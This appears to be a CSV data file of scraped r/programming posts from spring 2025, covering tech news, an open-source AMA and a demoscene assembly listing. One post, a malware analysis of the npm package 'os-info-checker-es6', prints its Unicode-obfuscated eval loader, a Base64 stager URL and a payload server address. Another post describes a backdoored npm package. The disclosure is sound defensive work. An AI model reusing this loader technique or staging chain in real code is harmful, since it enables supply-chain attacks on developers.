@@ -1,0 +1,949 @@
+﻿content_id,platform,title,content,created_at,source_id,source_name,category_id,category_name,tags,views,score,comment_count,duration,upvote_ratio,url,author,crawl_time
+1ktl1ba,reddit,Just fucking code.,,2025-05-23T14:31:32Z,programming,programming,technology,Technology,[],0,3519,526,,0.87,https://www.justfuckingcode.com/,wagslane,2025-05-25T16:58:52.231767Z
+1kqfkso,reddit,The Dumbest Move in Tech Right Now: Laying Off Developers Because of AI,"Are companies using AI just to justify trimming the fat after years of over hiring and allowing Hooli-style jobs for people like Big Head? Otherwise, I feel like I’m missing something—why lay off developers now, just as AI is finally making them more productive, with so much software still needing to be maintained, improved, and rebuilt?",2025-05-19T16:08:43Z,programming,programming,technology,Technology,[],0,2586,411,,0.94,https://ppaolo.substack.com/p/the-dumbest-move-in-tech-right-now,oloap,2025-05-25T16:58:55.794720Z
+1kel9lq,reddit,The enshittification of tech jobs,,2025-05-04T14:35:28Z,programming,programming,technology,Technology,[],0,1673,371,,0.94,https://pluralistic.net/2025/04/27/some-animals/#are-more-equal-than-others,namanyayg,2025-05-25T16:58:59.368437Z
+1km8mbc,reddit,Stack Overflow seeks rebrand as traffic continues to plummet – which is bad news for developers,,2025-05-14T06:44:14Z,programming,programming,technology,Technology,[],0,1623,576,,0.97,https://devclass.com/2025/05/13/stack-overflow-seeks-rebrand-as-traffic-continues-to-plummet-which-is-bad-news-for-developers/,tofino_dreaming,2025-05-25T16:59:02.404416Z
+1ke8bsm,reddit,All four major web browsers are about to lose 80% of their funding,,2025-05-04T01:25:05Z,programming,programming,technology,Technology,[],0,1542,552,,0.94,https://danfabulich.medium.com/all-four-major-web-browsers-are-about-to-lose-80-of-their-funding-0e42ceb358f1,namanyayg,2025-05-25T16:59:06.539774Z
+1kc8anc,reddit,"AMA: I started an open source project in 2004. This week, it hit 30,000 GitHub stars. Here’s what I learned over 21 years.","In 2004 (before I had kids, before GitHub was even a thing), I started building a tool to help with client projects at my creative agency. All my projects were different, but they all had one thing in common — data. I was using phpMyAdmin a lot and had this idea: what if I rebuilt it, but made it safe and intuitive enough to hand off to clients? It was early and messy, but it worked. Just PHP, MySQL, and me. No roadmap, no Discord, no traction. Just a personal itch I needed to scratch.
+
+This week, that little side project crossed 30,000 GitHub stars — now ranked #772 out of 400M+ repos.
+
+If you’ve ever wondered what a two-decade open source journey feels like, or what happens when your weekend project turns into a company with 50+ people… here’s the ride.
+
+# 0 Stars — Ground Zero (2004–2014)
+
+I didn’t call it a startup. I didn’t even call it a project. It was just a tool.
+
+For 10 years, I used it for client work. Without community or contributors. Just me duct-taping new features on between gigs. I had no clue what open source meant beyond “put your code online.” I saw the success of WordPress and (not being a lawyer) just slapped on the same license they used: GPLv3. That was in 2011.
+
+At some point, I hooked up a little hardware counter on my desk that showed the live GitHub star count. Every single new star felt massive. Like someone out there had *found* it. It was a weird kind of validation — one blip at a time.
+
+Towards the end of this stretch, my mom started asking a lot of questions. Mostly versions of: “Why are you spending so much time on something you’re just giving away for free?” I didn’t have a great answer… but that I knew if it got popular enough, the rest would figure itself out.
+
+Lesson\*\*:\*\* Build for yourself first. Forget trends. If it’s not solving your problem, it won’t solve anyone else’s either.
+
+# 10k Stars — Momentum (2015–2020)
+
+Suddenly… people started noticing. I don’t even know how. Reddit posts? GitHub Explore? Devs sharing in Slack groups?
+
+It was thrilling. Also chaotic.
+
+Somewhere in that chaos, I started treating the software as more than just a side project. I was still doing the occasional client gig to stay afloat, but most of my time was going into this thing.
+
+That’s also when I met Rijk van Zanten — now my co-founder — and together we took my spaghetti code and made it stable. We migrated from Backbone to Vue, and from PHP to Node. That refactor was a turning point.
+
+At one point, we got flown out to San Francisco to pitch the software to a multi-billion-dollar rideshare company. They told me it was the best solution they’d assessed — but that they couldn’t bet their entire data ecosystem on an informal two-person operation. Fair.
+
+Requests, PRs, and issues started to flow in. Some were incredibly helpful — but it took a *ton* of time to work through it all. And finding the signal in the noise was getting harder. A lot of PRs were quick fixes for specific use cases, often self-serving. But we knew we had to stay zoomed out — to translate those narrow asks into agnostic solutions that would work for the broader community. That mindset shift wasn’t easy, and it was *exhausting*.
+
+Lesson\*\*:\*\* Simplicity scales. But so does code debt. Say “no” more often than you say “yes.”
+
+# 20k Stars — From Maintainers to a Real Company (2020–2023)
+
+I shut down my agency — at that point, it was just a distraction. We formed a proper company (Delaware C-Corp), raised a $1M seed round, hired a small dev team, built a cloud platform, and landed our first few customers.
+
+Then came the Series A. We were still pre-revenue and needed runway to keep going. But it was early 2022 — *right* when the VC market flipped. Huge checks and sky-high valuations turned into silence. You could almost hear the purse strings snap shut. I talked to over 100 VCs before finally finding the right partner — someone who actually understood open source, and who happened to be an early investor in both WordPress and HashiCorp. This time we raised $8M.
+
+That was the moment I really had to confront what sustainability looks like in OSS. It’s a delicate balance: giving something away for free, but needing revenue for it to survive. And not just for me — for our team, their families, their healthcare, their mortgages. All of it.
+
+We brought the community into the conversation. Asked how we could monetize without breaking our open-source ethos. We even worked with Bruce Perens, co-founder of the OSI, to help craft a license that felt right — free for almost everyone, but with fair (financial) contributions for large enterprises.
+
+Lesson\*\*:\*\* Open source doesn’t mean free labor. If you want it to last, be intentional about the business model.
+
+# 30k Stars — Sustainable Open Source (2023–2025)
+
+This part is the hardest to describe, because it’s happening right now.
+
+We’ve grown into a passionate, distributed team of 50 people (mostly devs) spread across the world. And for the first time, profitability is in sight. That means security. That means not being beholden to investors or distracted by chasing the next round. We’re building to last.
+
+That said… we *did* raise a quiet $9M up-round from new investors we really trust — just enough to give us runway to tackle the next big refactor. It’s massive. It’s architectural. And it’s the foundation for what’s coming next.
+
+We’ve also been landing some of the biggest brands, orgs, and government agencies on the planet as customers. That’s been surreal — but validating.
+
+None of this came without friction. We’ve had to make real decisions — licensing, pricing, feature gates — and some of those pissed people off. But if you’re transparent, the community (the real one, not just the loudest voices) sticks with you.
+
+And when they do, something shifts. The project stops moving because of you… and starts moving with you.
+
+Lesson\*\*:\*\* Community isn’t a marketing channel. It’s the engine. Talk to them like humans, not users.
+
+# 40k Stars — What’s Next (2025+)
+
+Now, we’re deep in a full rewrite. There are some extremely significant and exciting changes being baked in… and still trying to stay radically unopinionated as everything else grows more opinionated.
+
+But the north star hasn’t changed: build tools we’d want to use — and make sure they scale beyond us.
+
+I’ve been posting about this project on Reddit for over 14 years. Some of those posts hit the front page — like [this one from 2020](https://www.reddit.com/r/programming/comments/fl8z09/weve_spent_over_a_decade_building_an_opensource/) — and some got *zero* traction at all — like [this early one from way back](https://www.reddit.com/r/compsci/comments/gqzxi/been_working_on_php_cms_for_about_5_years_looking/). But every comment, every question, every bit of critique helped shape what this became.
+
+This community has been wildly helpful — and I just want to say thanks for that.
+
+I’ll be around all day… AMA about the early days, the hard pivots, technical tradeoffs, open source mistakes, company-building wins, whatever. I’ll answer every question.
+
+Let’s chat! 🙌",2025-05-01T13:07:48Z,programming,programming,technology,Technology,[],0,1224,130,,0.94,https://medium.com/@ben_haynes/i-started-an-open-source-project-in-2004-8d38820a7ecd,benhaynes,2025-05-25T16:59:10.607679Z
+1klfj0y,reddit,Firefox moves to GitHub,,2025-05-13T06:58:36Z,programming,programming,technology,Technology,[],0,1219,196,,0.97,https://github.com/mozilla-firefox/firefox,klaasvanschelven,2025-05-25T16:59:12.528981Z
+1kp8vnm,reddit,"""Mario Kart 64"" decompilation project reaches 100% completion",,2025-05-18T01:47:01Z,programming,programming,technology,Technology,[],0,867,117,,0.97,https://gbatemp.net/threads/mario-kart-64-decompilation-project-reaches-100-completion.671104/,r_retrohacking_mod2,2025-05-25T16:59:14.922852Z
+1kncoi8,reddit,"Microsoft support for ""Faster CPython"" project cancelled",,2025-05-15T16:33:31Z,programming,programming,technology,Technology,[],0,850,228,,0.97,https://www.linkedin.com/posts/mdboom_its-been-a-tough-couple-of-days-microsofts-activity-7328583333536268289-p4Lp,Halkcyon,2025-05-25T16:59:17.011313Z
+1kaijfr,reddit,"Why did Windows 7, for a few months, log on slower if you have a solid color background?",,2025-04-29T07:55:09Z,programming,programming,technology,Technology,[],0,780,120,,0.95,https://devblogs.microsoft.com/oldnewthing/20250428-00/?p=111121,NXGZ,2025-05-25T16:59:19.256272Z
+1kl8wz0,reddit,I hacked a dating app (and how not to treat a security researcher),,2025-05-13T00:45:15Z,programming,programming,technology,Technology,[],0,743,123,,0.95,https://alexschapiro.com/blog/security/vulnerability/2025/04/21/startups-need-to-take-security-seriously,iamkeyur,2025-05-25T16:59:20.881160Z
+1kh8jkt,reddit,CLion Is Now Free for Non-Commercial Use,,2025-05-07T21:03:23Z,programming,programming,technology,Technology,[],0,727,73,,0.96,https://blog.jetbrains.com/clion/2025/05/clion-is-now-free-for-non-commercial-use/,BigusBigolius,2025-05-25T16:59:22.690348Z
+1kraxbm,reddit,Rust turns 10: How a broken elevator changed software forever,,2025-05-20T17:33:51Z,programming,programming,technology,Technology,[],0,712,231,,0.9,https://www.zdnet.com/article/rust-turns-10-how-a-broken-elevator-changed-software-forever/,Several-Space5648,2025-05-25T16:59:24.115198Z
+1kk88p8,reddit,Netflix is built on Java,"Here is a summary of how netflix is built on java and how they actually collaborate with spring boot team to build custom stuff. 
+
+For people who want to watch the full video from netflix team : [https://youtu.be/XpunFFS-n8I?si=1EeFux-KEHnBXeu\_](https://youtu.be/XpunFFS-n8I?si=1EeFux-KEHnBXeu_)",2025-05-11T18:49:55Z,programming,programming,technology,Technology,[],0,684,268,,0.87,https://youtu.be/sMPMiy0NsUs?si=lF0NQoBelKCAIbzU,stealth_Master01,2025-05-25T16:59:26.668602Z
+1kqist6,reddit,The Windows Subsystem for Linux is now open source,,2025-05-19T18:13:34Z,programming,programming,technology,Technology,[],0,679,101,,0.98,https://blogs.windows.com/windowsdeveloper/2025/05/19/the-windows-subsystem-for-linux-is-now-open-source/,beyphy,2025-05-25T16:59:29.352425Z
+1kjcjzd,reddit,There's no need to over engineer a URL shortener,,2025-05-10T15:12:55Z,programming,programming,technology,Technology,[],0,665,253,,0.92,https://www.luu.io/posts/2025-over-engineer-url-shortener,sluu99,2025-05-25T16:59:31.096281Z
+1knu1w1,reddit,"Senior devs aren't just faster, they're dodging problems you're forced to solve",,2025-05-16T06:24:17Z,programming,programming,technology,Technology,[],0,646,230,,0.88,https://boydkane.com/essays/experts,L_Impala,2025-05-25T16:59:33.624761Z
+1ko19vq,reddit,Insane malware hidden inside NPM with invisible Unicode and Google Calendar invites!,"I’ve shared a lot of malware stories—some with silly hiding techniques. But this? This is hands down the most **beautiful** piece of obfuscation I’ve ever come across. I had to share it. I've made a video, but also below I decided to do a short write-up for those that don't want to look at my face for 6 minutes. 
+
+# The Discovery: A Suspicious Package
+
+We recently uncovered a **malicious NPM package** called `os-info-checker-es6` (still live at the time of writing). It combines **Unicode obfuscation**, **Google Calendar abuse**, and **clever staging logic** to mask its payload.
+
+The first sign of trouble was in version `1.0.7`, which contained a sketchy `eval` function executing a Base64-encoded payload. Here’s the snippet:
+
+    const fs = require('fs');
+    const os = require('os');
+    const { decode } = require(getPath());
+    const decodedBytes = decode('|󠅉󠄢󠄩󠅥󠅓󠄢󠄩󠅣󠅊󠅃󠄥󠅣󠅒󠄢󠅓󠅟󠄺󠄠󠄾󠅟󠅊󠅇󠄾󠅢󠄺󠅩󠅛󠄧󠄳󠅗󠄭󠄭');
+    const decodedBuffer = Buffer.from(decodedBytes);
+    const decodedString = decodedBuffer.toString('utf-8');
+    eval(atob(decodedString));
+    fs.writeFileSync('run.txt', atob(decodedString));
+    
+    function getPath() {
+      if (os.platform() === 'win32') {
+        return `./src/index_${os.platform()}_${os.arch()}.node`;
+      } else {
+        return `./src/index_${os.platform()}.node`;
+      }
+    }
+
+At first glance, it looked like it was just decoding a single character—the `|`. But something didn’t add up.
+
+# Unicode Sorcery
+
+What was **really** going on? The string was filled with **invisible Unicode Private Use Area (PUA)** characters. When opened in a Unicode-aware text editor, the decode line actually looked something like this:
+
+    const decodedBytes = decode('|󠅉...󠄭[X][X][X][X]...');
+
+Those `[X]` placeholders? They're PUA characters **defined within the package itself**, rendering them invisible to the eye but fully functional in code.
+
+And what did this hidden payload deliver?
+
+    console.log('Check');
+
+Yep. That’s it. A total anticlimax.
+
+But we knew something more was brewing. So we waited.
+
+# Two Months Later…
+
+Version `1.0.8` dropped.
+
+Same Unicode trick—**but a much longer payload**. This time, it wasn’t just logging to the console. One particularly interesting snippet fetched data from a **Base64-encoded URL**:
+
+    const mygofvzqxk = async () => {
+      await krswqebjtt(
+        atob('aHR0cHM6Ly9jYWxlbmRhci5hcHAuZ29vZ2xlL3Q1Nm5mVVVjdWdIOVpVa3g5'),
+        async (err, link) => {
+          if (err) {
+            console.log('cjnilxo');
+            await new Promise(r => setTimeout(r, 1000));
+            return mygofvzqxk();
+          }
+        }
+      );
+    };
+
+Once decoded, the string revealed:
+
+    https://calendar.app.google/t56nfUUcugH9ZUkx9
+
+Yes, **a Google Calendar link**—safe to visit. The *event title* itself was **another Base64-encoded URL** leading to the final payload location:
+
+    http://140[.]82.54.223/2VqhA0lcH6ttO5XZEcFnEA%3D%3D
+
+(DO NOT visit that second one.)
+
+# The Puzzle Comes Together
+
+At this final endpoint was the **malicious payload**—but by the time we got to it, the URL was **dormant**. Most likely, the attackers were still preparing the final stage.
+
+At this point, we started noticing the package being included in dependencies for other projects. That was a red flag—we couldn’t afford to wait any longer. It was time to report and get it taken down.
+
+# This was one of the most fascinating and creative obfuscation techniques I’ve seen:
+
+Absolute A+ for stealth, even if the end result wasn’t world-ending malware (yet). So much fun
+
+Also a more detailed article is here -> [https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas](https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas)
+
+NPM package link -> [https://www.npmjs.com/package/os-info-checker-es6](https://www.npmjs.com/package/os-info-checker-es6)",2025-05-16T13:46:49Z,programming,programming,technology,Technology,[],0,627,95,,0.96,https://www.youtube.com/watch?v=N8dHa2b-I5A,Advocatemack,2025-05-25T16:59:36.030773Z
+1kht5es,reddit,Microservices Are a Tax Your Startup Probably Can’t Afford,,2025-05-08T15:37:11Z,programming,programming,technology,Technology,[],0,616,184,,0.9,https://nexo.sh/posts/microservices-for-startups/,lelanthran,2025-05-25T16:59:37.297726Z
+1kgw709,reddit,AI is Making Developers Lazy: RIP Core Coding Skills,,2025-05-07T12:32:53Z,programming,programming,technology,Technology,[],0,593,378,,0.82,https://www.darrenhorrocks.co.uk/ai-making-developers-lazy-rip-core-coding-skills/,bizzehdee,2025-05-25T16:59:39.408903Z
+1kih4a7,reddit,"Figma threatens companies using ""Dev Mode""",,2025-05-09T12:21:14Z,programming,programming,technology,Technology,[],0,586,210,,0.93,https://www.youtube.com/watch?v=P73EGVfKNr0,Chii,2025-05-25T16:59:42.489610Z
+1ksmck9,reddit,Jetbrains releases an official LSP for Kotlin,,2025-05-22T09:22:09Z,programming,programming,technology,Technology,[],0,536,39,,0.96,https://github.com/Kotlin/kotlin-lsp,natandestroyer,2025-05-25T16:59:44.759893Z
+1kd5epo,reddit,Microsoft inserts ads for Copilot into the docs,,2025-05-02T16:34:26Z,programming,programming,technology,Technology,[],0,530,91,,0.83,https://github.com/dotnet/docs/issues/45996,Atulin,2025-05-25T16:59:45.796437Z
+1klnvky,reddit,I built a type-safe .NET casting library powered by AI. It works disturbingly well.,"I built ArtificialCast, a type-safe .NET casting library powered by AI.  
+It works disturbingly well.
+
+No reflection. No hand-written mappers. Just types, structure, and inference.
+
+You can build full workflows with zero logic—and they pass tests.
+
+It’s clean. It’s typed. It’s dangerously convenient.
+
+And yes, it absolutely should not exist.
+
+**More context is in the readme in the github repo**
+
+",2025-05-13T14:49:23Z,programming,programming,technology,Technology,[],0,516,86,,0.82,https://github.com/Zorokee/ArtificialCast,Zorokee,2025-05-25T16:59:47.140544Z
+1kopkmf,reddit,Seed7: a programming language I've been working on for decades,"Seed7 is based on ideas from my diploma and doctoral theses about an extensible programming language (1984 and 1986). In 1989 development began on an interpreter and in 2005 the project was released as open source. Since then it is improved on a regular basis.
+
+Seed7 is about [readability](https://thomasmertes.github.io/Seed7Home/faq.htm#readability), [portability](https://thomasmertes.github.io/Seed7Home/faq.htm#portable), [performance](https://thomasmertes.github.io/Seed7Home/scrshots/s7c.htm) and [memory safety](https://thomasmertes.github.io/Seed7Home/faq.htm#memory_safety). There is an [automatic memory management](https://thomasmertes.github.io/Seed7Home/faq.htm#garbage_collection), but there is no garbage collection process, that interrupts normal processing.
+
+The [Seed7 homepage](https://thomasmertes.github.io/Seed7Home) contains the language documentation. The source code is at [GitHub](https://github.com/ThomasMertes/seed7). Questions that are not in the [FAQ](https://thomasmertes.github.io/Seed7Home/faq.htm) can be asked at [r/seed7](https://www.reddit.com/r/seed7/).
+
+Some programs written in Seed7 are:
+
+* [make7](https://thomasmertes.github.io/Seed7Home/scrshots/make7.htm): a make utility.
+* [bas7](https://thomasmertes.github.io/Seed7Home/scrshots/bas7.htm): a BASIC interpreter.
+* [pv7](https://thomasmertes.github.io/Seed7Home/scrshots/pv7.htm): a Picture Viewer for BMP, GIF, ICO, JPEG, PBM, PGM, PNG, PPM and TIFF files.
+* [tar7](https://thomasmertes.github.io/Seed7Home/scrshots/tar7.htm): a tar archiving utility.
+* [ftp7](https://thomasmertes.github.io/Seed7Home/scrshots/ftp7.htm): an FTP Internet file transfer program.
+* [comanche](https://thomasmertes.github.io/Seed7Home/scrshots/comanche.htm): a simple web server for static HTML pages and CGI programs.
+
+Screenshots of Seed7 programs can be found [here](https://thomasmertes.github.io/Seed7Home/scrshots/index.htm) and there is a [demo page](https://thomasmertes.github.io/Seed7Home/demo.htm) with Seed7 programs, which can be executed in the browser. These programs have been compiled to JavaScript / WebAssembly.
+
+I recently [released a new version](https://www.reddit.com/r/seed7/comments/1kona5g/seed7_version_20250516_released_on_github_and_sf/) that adds support for JSON serialization / deserialization and introduces a [seed7-mode for Emacs](https://github.com/pierre-rouleau/seed7-mode/tree/main).
+
+Please let me know what you think, and consider starring the project on [GitHub](https://github.com/ThomasMertes/seed7), thanks!",2025-05-17T10:11:20Z,programming,programming,technology,Technology,[],0,475,152,,0.87,https://thomasmertes.github.io/Seed7Home,ThomasMertes,2025-05-25T16:59:48.972552Z
+1kcetkp,reddit,Redis is open source again -antirez,,2025-05-01T17:43:09Z,programming,programming,technology,Technology,[],0,457,86,,0.97,https://antirez.com/news/151,ChiliPepperHott,2025-05-25T16:59:50.781320Z
+1kmjnu5,reddit,Why untested AI-generated code is a crisis waiting to happen,,2025-05-14T16:31:46Z,programming,programming,technology,Technology,[],0,432,198,,0.8,https://leaddev.com/software-quality/why-untested-ai-generated-code-is-a-crisis-waiting-to-happen,scarey102,2025-05-25T16:59:52.520717Z
+1k8n6re,reddit,CS programs have failed candidates.,,2025-04-26T21:04:39Z,programming,programming,technology,Technology,[],0,417,663,,0.77,https://www.youtube.com/watch?v=t_3PrluXzCo,BlueGoliath,2025-05-25T16:59:54.415026Z
+1kpld8h,reddit,"Mystical, a Visual Programming Language",,2025-05-18T14:33:31Z,programming,programming,technology,Technology,[],0,395,74,,0.95,https://suberic.net/~dmm/projects/mystical/README.html,namanyayg,2025-05-25T16:59:58.263269Z
+1kgu2rh,reddit,RATatouille: Popular NPM project backdoored with Remote Access Trojan (RAT),"First of all, I apologies for the Dad Pun, I really can't help it.
+
+# TL;DR:
+
+* `rand-user-agent` npm package was backdoored.
+* RAT hidden via whitespace in `dist/index.js`.
+* Executes on import: remote shell, file upload, PATH hijack.
+* Affected versions: `1.0.110`, `2.0.83`, `2.0.84`.
+* npm token compromise — not GitHub.
+
+On May 6 (yesterday) we detected the NPM package `rand-user-agent` had some crazy weird obfuscated code in `dist/index.js`. The package (\~45k weekly downloads) had been backdoored with a **Remote Access Trojan (RAT)**. *It was first turned malicious 10 days ago so unfortunately it almost certainly has had some impact.*
+
+This one was really hard to spot, firstly the attackers took a tip from our friends at Lazarus and hid the code off screen in NPM code viewer box by adding a bunch of white spaces. *A stupid but effective method of hiding malware.* The malicious code was so long (on one line) that you could barely see the scroll bar to give you any indication anything was wrong.
+
+Secondly the code was dynamically obfuscated 3 times meaning it was quite hard to get it back to anything resembling a readable version.
+
+",2025-05-07T10:34:03Z,programming,programming,technology,Technology,[],0,363,73,,0.95,https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise,Advocatemack,2025-05-25T16:59:59.707343Z
+1k7m7bh,reddit,"Writing ""/etc/hosts"" breaks the Substack editor",,2025-04-25T14:23:13Z,programming,programming,technology,Technology,[],0,346,76,,0.94,https://scalewithlee.substack.com/p/when-etchsts-breaks-your-substack,FoleyDiver,2025-05-25T17:00:01.118188Z
+1kgwjl5,reddit,CLion Is Now Free for Non-Commercial Use,,2025-05-07T12:49:55Z,programming,programming,technology,Technology,[],0,336,51,,0.95,https://blog.jetbrains.com/clion/2025/05/clion-is-now-free-for-non-commercial-use/,gmes78,2025-05-25T17:00:02.474492Z
+1k9h9k1,reddit,How a Single Line Of Code Could Brick Your iPhone,,2025-04-27T23:12:37Z,programming,programming,technology,Technology,[],0,323,38,,0.88,https://rambo.codes/posts/2025-04-24-how-a-single-line-of-code-could-brick-your-iphone,NXGZ,2025-05-25T17:00:03.665647Z
+1ka48nb,reddit,Migrating away from Rust,,2025-04-28T19:28:01Z,programming,programming,technology,Technology,[],0,329,172,,0.83,https://deadmoney.gg/news/articles/migrating-away-from-rust,Brilliant-Sky2969,2025-05-25T17:00:04.886527Z
+1kbiu8w,reddit,Minecraft like landscape in less than a tweet,"""Enchanted"" is a 256 bytes(!) program that achieved 2nd place at this years ""Revision"" 256 bytes competition. The music you hear is also produced by these 256 bytes of code.
+
+  
+[Youtube Capture](https://www.youtube.com/watch?v=R3SgDwyblis)
+
+[Revision Website](https://2025.revision-party.net/blog/afterparty/)
+
+[Download & Comment](https://www.pouet.net/prod.php?which=103924)
+
+Code below (x86 assembler for MSDOS, compile with NASM)
+
+`; ""Enchanted"" - 256 bytes intro for MSDOS`
+
+`; shown at Revision Demoparty 2025`
+
+
+
+`; original voxel engine from Rudi/Darklite (""Pluto"", 2012)`
+
+`; optimization, design, music by HellMood/DSR`
+
+`; DosBox X recommended, use provided config file`
+
+`; needs MIDI set to UART and about 193k cycles`
+
+
+
+`%define skyheight 66`	`; literally the skyheight`
+
+`%define le_tempo 99*2`	`; animation and music tempo`
+
+`%define scapetime 15`	`; init time for the landscape`
+
+`%define delay 13`		`; delay (0-15)`
+
+`%define midi_inst 82`	`; flute`
+
+`%define os 31`			`; note offset`
+
+`org 100h`	
+
+`xchg cx,ax`				`; get ""65536"" in CX for star loop`
+
+`mov al, 13h`				`; 320 x 200`
+
+`ptop:`
+
+`int 10h`	   				`; set mode ; set color`
+
+		`movsx cx,bl`		`; Rrrolas Palette with Tomcats Bug ^^`
+
+		`xor cl,ch`		`; alternative code variation`
+
+		`mov ah,cl`
+
+		`mov ch,cl`
+
+		`mul cx`
+
+		`shr cx,1`     
+
+		`inc bl`       
+
+		`jns pmid`     
+
+		`xchg cl,dh`
+
+		`pmid:`
+
+		`mov ax,0x1010`
+
+		`jnz ptop`
+
+		
+
+		`les ax,[bx]`		`; get screen address`
+
+		`stars:`
+
+		`sub al,cl`		`; pseudo`
+
+		`adc [si],ch`		`; random`
+
+		`jz S1`
+
+		`salc`			`; black`
+
+		`S1:`
+
+		`stosb`			`; star`
+
+		`loop stars`		`; more stars!`
+
+			
+
+	`mov ax,0x8027`		`; segment start and landscape seed`
+
+	`mov es, ax`			`; offscreen segments`
+
+	`mov gs, ax`
+
+`xor bp,bp`			`; time = 0`
+
+ 
+
+		`L:`	
+
+		`add al, ch` 		`; pseudo random init`
+
+		`stosb`			`; for the voxel landscape`
+
+		`loop L`
+
+	`DRAW2:`	
+
+		`mov bl,scapetime`
+
+		`B:`	
+
+		`es lodsw`		`; 4 neighbourhood smoothing`
+
+		`dec si`
+
+		`add ax, [es:si-257]`		
+
+		`add al, ah`
+
+		`shr al, 2`
+
+		`inc ax`				
+
+		`stosb`					
+
+		`loop B`			`; often`
+
+		`dec bx`
+
+		`jnz B`			`; VERY often`
+
+`mov fs,ax`
+
+`DRAW:`	
+
+	`mov si, 320`
+
+`XLOOP:`	
+
+	`xor di, di`
+
+	`mov bl, 200-skyheight-1`
+
+`TLOOP:`	
+
+		`push si`
+
+`push di`
+
+`shr di,1`
+
+`sub si, di ; curve`
+
+`pop di`
+
+			`imul si, di`
+
+			`xchg si,ax`
+
+			`lea dx,[bp+di]`	`; offset by time`
+
+			`mov dh,ah`		`; combine hi and lo byte for lookup`
+
+			`mov si,dx`			
+
+			`DDD:`
+
+			`gs lodsw`		`; height from map`
+
+		`pop si`
+
+		`imul dx,ax,byte 6`	`; color compression`
+
+
+
+		`inc di`
+
+		`push dx`				`; remember color`
+
+		`cwd`
+
+		`div di`	`; divide heigth by distance -> persp`
+
+
+
+		`shld dx,di,14`
+
+		`add al,dl ; curve height by distance (horizon)`
+
+		
+
+		`sub al,65 ; adjust general height`
+
+		`pop dx`		`; restore color`
+
+		`inc bx`
+
+`KK:`
+
+		`dec bx`		`; draw line ...`
+
+		`push bx`
+
+			`imul bx,320`
+
+			`mov [fs:bx+si-1], dh`
+
+		`pop bx`
+
+		`cmp ax,bx`		
+
+		`jb KK`		`; ...`
+
+`Y_LD:`
+
+		`cmp di, 340`
+
+		`jnz TLOOP`
+
+		`dec si`
+
+	 `jnz XLOOP`			
+
+	 `hlt`			`; sync against timer ( ~ 25 FPS )` 
+
+	 `push 0a000h+20*skyheight`
+
+	 `pop es`
+
+`CP:`	
+
+	`mov ax,di`
+
+	`mov al,ah`
+
+	`xchg al, [fs:di]`		`; write sky, get voxel`
+
+	`imul dx,di,byte 117`		`; pseudo random`
+
+	`xor dl,dh`
+
+	`mov dh,0`				`; only last 8 bits`
+
+	`add dx,bp`				`; offset by time`
+
+	`shr dh,1`				`; fade yes/no`
+
+	 `jnz tzu`
+
+	 `clear:`
+
+	 `inc di`
+
+	 `jmp short noplot`
+
+	`tzu:`
+
+	
+
+	`stosb`					`; write pixel`
+
+	`noplot:`					`; dont xD`
+
+	`imul di,byte 85`			`; pseudo randomize`
+
+	`loop CP`
+
+	`mov al,le_tempo`			`; set tempo`
+
+	`out 40h,al`
+
+
+
+`inc bp`
+
+`pusha`
+
+
+
+`mov dx,330h`			`; midi port`
+
+`mov cl,8`			`; 8 note trials per tick`
+
+`M:sub bp,byte 12`
+
+	`js nomuse`		`; luxury, cold start <3`
+
+	`test bp,31`
+
+	`jnz nomuse`
+
+	`shld bx,bp,11`	`; time to note`
+
+	`mov si,preface ; output midi data from below`
+
+	`outsb`			`; set instrument command`
+
+	`outsb`			`; instrument number`
+
+	`outsb`			`; change channel parameter`
+
+	`outsb`			`; panning`
+
+`imul ax,cx,byte 16`
+
+	`out dx,al`		`; send panning value`
+
+	`outsb`			`; send play note command`
+
+	`and bx,byte 7`	`; reduce to 8`
+
+	`mov al,[bx+si]`	`; read note`
+
+	`out dx,al`		`; send note value`
+
+	`imul ax,cx,byte delay ; calculate ...`
+
+	`add al,127-delay*8`		`; ... volume`
+
+	`out dx,al`		`; send volume value`
+
+
+
+`nomuse:`
+
+`loop M`
+
+`nodr:`
+
+`popa`		
+
+`GG:`
+
+`in al,0x60`		`; wait for ESC`
+
+`dec al`
+
+`jnz DRAW`
+
+`QQQ:`
+
+`preface:` 
+
+`db 0xc3,midi_inst`	`; 0xC3 = change instrument = RET`
+
+`db 0xb3,0xa,0x93`	`; stereo panning setup`
+
+`notes:` 
+
+`db os+27+12,os+23+12,os+30,os+16-12,os+23+12,os+20+12`
+
+`db os+25+2`
+
+`db os+20-12`
+
+",2025-04-30T15:08:39Z,programming,programming,technology,Technology,[],0,315,56,,0.88,https://www.pouet.net/prod.php?which=103924,Hell__Mood,2025-05-25T17:00:06.980782Z
+1kl0wkn,reddit,Redis Is Open Source Again. But Is It Too Late?,"Redis 8 is now licensed under AGPLv3 and officially open source again.  
+I wrote about how this shift might not be enough to win back the community that’s already moved to Valkey.
+
+Would you switch back? Or has that ship sailed?",2025-05-12T19:03:14Z,programming,programming,technology,Technology,[],0,308,49,,0.92,https://blog.abhimanyu-saharan.com/posts/redis-is-open-source-again-but-is-it-too-late,abhimanyu_saharan,2025-05-25T17:00:08.560990Z
+1krh71o,reddit,GitHub wants to spam open source projects with AI slop,,2025-05-20T21:47:31Z,programming,programming,technology,Technology,[],0,305,170,,0.8,https://youtube.com/watch?v=XM1EPHaHBuM&si=HaO1jkOh8weRjzUI,nnomae,2025-05-25T17:00:09.875197Z
+1khoeyy,reddit,Distributed TinyURL Architecture: How to handle 100K URLs per second,,2025-05-08T12:05:40Z,programming,programming,technology,Technology,[],0,301,126,,0.9,https://animeshgaitonde.medium.com/distributed-tinyurl-architecture-how-to-handle-100k-urls-per-second-54182403117e?sk=081477ba4f5aa6c296c426e622197491,Local_Ad_6109,2025-05-25T17:00:11.776352Z
+1klwukk,reddit,Dusk OS: An operating system for the end of the world,,2025-05-13T20:43:04Z,programming,programming,technology,Technology,[],0,283,52,,0.93,https://duskos.org/,ChiliPepperHott,2025-05-25T17:00:13.384850Z
+1k92328,reddit,Why hash tables are so fast (Explained with visuals and GIFs),,2025-04-27T11:45:44Z,programming,programming,technology,Technology,[],0,271,40,,0.86,https://medium.com/@volodymyrpotiichuk/why-hash-tables-65483b7dbf9c,NoBarber9673,2025-05-25T17:00:14.706561Z
